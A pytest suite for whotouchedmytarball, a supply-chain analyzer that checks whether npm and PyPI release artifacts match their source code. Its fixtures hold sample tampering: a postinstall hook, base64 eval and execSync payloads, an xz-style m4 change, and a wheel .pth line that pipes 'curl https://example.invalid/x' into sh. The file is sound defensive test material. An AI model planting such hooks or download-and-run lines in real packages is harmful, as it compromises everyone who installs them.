"""End-to-end tests on local artifacts (no network)."""

from __future__ import annotations

import json

import pytest

from whotouchedmytarball.analyzer import AnalyzeOptions, analyze_local
from whotouchedmytarball.models import Category, Severity

from .conftest import INDEX_JS, make_tgz, make_zip, npm_manifest, write_tree

OPTS = AnalyzeOptions(ai=None)


def finding(report, path):
    return next(f for f in report.findings if f.path == path)


def test_clean_npm_release(tmp_path, npm_source):
    pkg = make_tgz(tmp_path / "demo.tgz", {
        "package.json": npm_manifest(), "index.js": INDEX_JS, "README.md": "# demo\n", "LICENSE": "MIT\n",
    })
    report = analyze_local(pkg, str(npm_source), opts=OPTS)
    assert report.verdict == "CLEAN"
    assert report.stats["identical"] == 3


def test_tampered_npm_release_is_suspicious(tmp_path, npm_source):
    evil_manifest = json.loads(npm_manifest())
    evil_manifest["scripts"]["postinstall"] = "node setup.js"
    pkg = make_tgz(tmp_path / "demo.tgz", {
        "package.json": json.dumps(evil_manifest),
        "index.js": INDEX_JS + "eval(Buffer.from('Y29uc29sZS5sb2coMSk=', 'base64').toString());\n",
        "setup.js": "require('child_process').execSync('id');\n",
    })
    report = analyze_local(pkg, str(npm_source), opts=OPTS)
    assert report.verdict == "SUSPICIOUS"
    assert finding(report, "index.js").severity == Severity.CRITICAL
    assert any(s.rule == "npm-install-hook" for s in finding(report, "package.json").signals)
    assert finding(report, "setup.js").category == Category.SUSPICIOUS


def test_code_file_with_documentation_name_is_scanned(tmp_path, npm_source):
    """Naming a payload security.js or history.js must not make it look like documentation."""
    payload = "require('child_process').execSync(Buffer.from('aWQ=', 'base64').toString());\n"
    pkg = make_tgz(tmp_path / "demo.tgz", {
        "package.json": npm_manifest(), "index.js": INDEX_JS, "security.js": payload, "lib/history.js": payload,
        "SECURITY": "Report issues privately.\n",
    })
    report = analyze_local(pkg, str(npm_source), opts=OPTS)
    assert report.verdict == "SUSPICIOUS"
    for path in ("security.js", "lib/history.js"):
        assert finding(report, path).category == Category.SUSPICIOUS
        assert finding(report, path).severity == Severity.CRITICAL
    assert finding(report, "SECURITY").category == Category.DOCUMENTATION


def test_build_output_explained_by_source_patterns(tmp_path):
    """A compiled file that uses child_process is fine when the TypeScript source does too."""
    src = write_tree(tmp_path / "source", {
        "package.json": npm_manifest(main="dist/index.js"),
        "src/index.ts": "import { execSync } from 'child_process';\nexport const v = execSync('git rev-parse HEAD');\n",
    })
    pkg = make_tgz(tmp_path / "demo.tgz", {
        "package.json": npm_manifest(main="dist/index.js"),
        "dist/index.js": "const child_process_1 = require('child_process');\n"
                         "exports.v = (0, child_process_1.execSync)('git rev-parse HEAD');\n",
    })
    report = analyze_local(pkg, str(src), opts=OPTS)
    f = finding(report, "dist/index.js")
    assert f.category == Category.BUILD_OUTPUT
    assert all(s.explained_by for s in f.signals)
    assert report.verdict == "CLEAN"


def test_new_file_is_not_excused_by_patterns_elsewhere_in_the_repo(tmp_path):
    """A test helper that uses child_process must not excuse an injected file with no source counterpart."""
    src = write_tree(tmp_path / "source", {
        "package.json": npm_manifest(main="lib/index.js"),
        "src/index.ts": "export const add = (a: number, b: number) => a + b;\n",
        "test/helpers.js": "const { execSync } = require('child_process');\n"
                           "const fixture = Buffer.from(process.argv[2], 'base64');\n",
    })
    payload = "require('child_process').execSync(Buffer.from('aWQ=', 'base64').toString());\n"
    pkg = make_tgz(tmp_path / "demo.tgz", {
        "package.json": npm_manifest(main="lib/index.js"),
        "lib/index.js": "exports.add = (a, b) => a + b;\n",
        "lib/telemetry.js": payload,  # no telemetry.* anywhere in the source
        "lib/chunk-3f9a.js": "module.exports = require('child_process');\n",  # bundler chunk, one signal
    })
    report = analyze_local(pkg, str(src), opts=OPTS)
    telemetry = finding(report, "lib/telemetry.js")
    assert telemetry.severity == Severity.CRITICAL  # decode + execute still combines
    assert any("no source file matches" in n for n in telemetry.notes)
    assert finding(report, "lib/chunk-3f9a.js").severity == Severity.MEDIUM  # stepped down, still flagged
    assert report.verdict == "SUSPICIOUS"


def test_injected_build_output_is_not_excused(tmp_path):
    """Build output is scanned: new behaviour that the source never had is flagged."""
    src = write_tree(tmp_path / "source", {
        "package.json": npm_manifest(main="dist/index.js"),
        "src/index.ts": "export const add = (a: number, b: number) => a + b;\n",
    })
    pkg = make_tgz(tmp_path / "demo.tgz", {
        "package.json": npm_manifest(main="dist/index.js"),
        "dist/index.js": "exports.add = (a, b) => a + b;\nwindow.fetch = function () {};\n",
    })
    report = analyze_local(pkg, str(src), opts=OPTS)
    assert report.verdict == "SUSPICIOUS"
    assert finding(report, "dist/index.js").category == Category.SUSPICIOUS


def test_python_sdist_metadata_is_expected(tmp_path):
    src = write_tree(tmp_path / "source", {
        "pyproject.toml": "[project]\nname='demo'\n",
        "src/demo/__init__.py": "VALUE = 1\n",
        "tests/test_demo.py": "def test(): pass\n",
    })
    pkg = make_tgz(tmp_path / "demo-1.0.tar.gz", {
        "PKG-INFO": "Metadata-Version: 2.1\nName: demo\n",
        "pyproject.toml": "[project]\nname='demo'\n",
        "src/demo/__init__.py": "VALUE = 1\n",
        "src/demo.egg-info/SOURCES.txt": "x\n",
        "setup.cfg": "[egg_info]\ntag_build = \ntag_date = 0\n\n",
    }, prefix="demo-1.0/")
    report = analyze_local(pkg, str(src), ecosystem="pypi", opts=OPTS)
    assert report.verdict == "CLEAN"
    assert finding(report, "PKG-INFO").category == Category.PACKAGING_METADATA


def test_wheel_with_malicious_pth_file(tmp_path):
    src = write_tree(tmp_path / "source", {"src/demo/__init__.py": "VALUE = 1\n"})
    pkg = make_zip(tmp_path / "demo-1.0-py3-none-any.whl", {
        "demo/__init__.py": "VALUE = 1\n",
        "demo-1.0.dist-info/METADATA": "Name: demo\n",
        "demo_init.pth": "import os; os.system('curl https://example.invalid/x | sh')\n",
    })
    report = analyze_local(pkg, str(src), opts=OPTS)
    assert report.source.root_prefix == "src/"
    assert report.verdict == "SUSPICIOUS"
    assert finding(report, "demo_init.pth").severity.rank >= Severity.HIGH.rank


def test_xz_style_modified_build_script(tmp_path):
    src = write_tree(tmp_path / "source", {"m4/build-to-host.m4": "AC_DEFUN([gl_BUILD_TO_HOST], [ok])\n"})
    pkg = make_tgz(tmp_path / "x-1.0.tar.gz", {
        "m4/build-to-host.m4": "AC_DEFUN([gl_BUILD_TO_HOST], [ok])\ngl_[$1]_prefix=`echo $gl_am_configmake | sed`\n",
    }, prefix="x-1.0/")
    report = analyze_local(pkg, str(src), ecosystem="pypi", opts=OPTS)
    assert finding(report, "m4/build-to-host.m4").severity.rank >= Severity.HIGH.rank


def test_new_unexplained_file_vs_previous_release(tmp_path, npm_source):
    common = {"package.json": npm_manifest(), "index.js": INDEX_JS}
    previous = make_tgz(tmp_path / "prev.tgz", {**common, "helper.js": "module.exports = 1;\n"})
    current = make_tgz(tmp_path / "cur.tgz", {**common, "helper.js": "module.exports = 1;\n",
                                              "telemetry.js": "module.exports = 2;\n"})
    report = analyze_local(current, str(npm_source), previous_artifact=previous, opts=OPTS)
    assert finding(report, "helper.js").severity == Severity.LOW  # shipped before
    assert finding(report, "telemetry.js").severity == Severity.MEDIUM  # new and unexplained
    assert report.verdict == "REVIEW"


def test_no_source_gives_unverified(tmp_path):
    pkg = make_tgz(tmp_path / "demo.tgz", {"package.json": npm_manifest(), "index.js": INDEX_JS})
    report = analyze_local(pkg, None, opts=OPTS)
    assert report.verdict == "UNVERIFIED"


def test_setuptools_rewritten_setup_cfg_is_metadata(tmp_path):
    src = write_tree(tmp_path / "source", {
        "setup.cfg": "[metadata]\nrequires-dist =\n    idna>=2.5\n    certifi\n",
        "src/demo/__init__.py": "VALUE = 1\n",
    })
    pkg = make_tgz(tmp_path / "demo-1.0.tar.gz", {
        "setup.cfg": "[metadata]\nrequires-dist = \n\tidna>=2.5\n\tcertifi\n\n[egg_info]\ntag_build = \ntag_date = 0\n\n",
        "src/demo/__init__.py": "VALUE = 1\n",
    }, prefix="demo-1.0/")
    report = analyze_local(pkg, str(src), ecosystem="pypi", opts=OPTS)
    assert finding(report, "setup.cfg").category == Category.PACKAGING_METADATA


@pytest.mark.parametrize("winner", ["tag", "githead"])
def test_tag_and_git_head_disagree_closest_tree_wins(monkeypatch, tmp_path, winner):
    """Neither ref is signed and either can be wrong (react: gitHead, lodash: tag); the closer tree wins."""
    from whotouchedmytarball import analyzer
    from whotouchedmytarball.sources import SourceCheckout

    pkg = write_tree(tmp_path / "pkg", {"a.js": "a\n", "b.js": "b\n"})
    good = write_tree(tmp_path / "good", {"a.js": "a\n", "b.js": "b\n"})
    stale = write_tree(tmp_path / "stale", {"a.js": "old\n", "b.js": "old\n"})
    trees = {"tag": good if winner == "tag" else stale, "githead": stale if winner == "tag" else good}

    def fake_fetch(url, *, commit=None, tag_candidates=None, ref=None):
        key = "githead" if commit else "tag"
        return SourceCheckout(trees[key], url, key, ("a" if commit else "f") * 40, key)

    monkeypatch.setattr(analyzer, "fetch_source", fake_fetch)
    notes = []
    root, info = analyzer._resolve_source(
        source=None, ref=None, repository="https://github.com/o/r", commits=[], tags=["v1.0.0"],
        fallback_commits=["a" * 40], notes=notes, progress=lambda m: None, package_root=pkg)
    assert root == good
    assert any("2 vs 0" in n or "0 vs 2" in n for n in notes)


def test_minified_build_of_readable_source_is_build_output(tmp_path, npm_source):
    """dayjs publishes minified copies of readable source files under the same name."""
    readable = "\n".join(f"const key{i} = 'value {i}';" for i in range(60)) + "\n"
    minified = ";".join(f"var k{i}='value {i}'" for i in range(60)) + "\n"
    src = write_tree(tmp_path / "source", {"package.json": npm_manifest(), "locale/de.js": readable})
    pkg = make_tgz(tmp_path / "demo.tgz", {"package.json": npm_manifest(), "locale/de.js": minified})
    report = analyze_local(pkg, str(src), opts=OPTS)
    assert finding(report, "locale/de.js").category == Category.BUILD_OUTPUT
    assert report.verdict == "CLEAN"


def test_long_lines_in_build_output_are_weak_evidence(tmp_path, npm_source):
    """Bundled declaration chunks (tanstack) have long lines; alone that should not trigger REVIEW."""
    long_line = "export { " + ", ".join(f"type T{i} as A{i}" for i in range(200)) + " };\n"
    pkg = make_tgz(tmp_path / "demo.tgz", {
        "package.json": npm_manifest(), "index.js": INDEX_JS, "build/hydration-BWO9yDiJ.d.ts": long_line,
    })
    report = analyze_local(pkg, str(npm_source), opts=OPTS)
    f = finding(report, "build/hydration-BWO9yDiJ.d.ts")
    assert f.category == Category.BUILD_OUTPUT and f.severity == Severity.LOW
    assert report.verdict == "CLEAN"
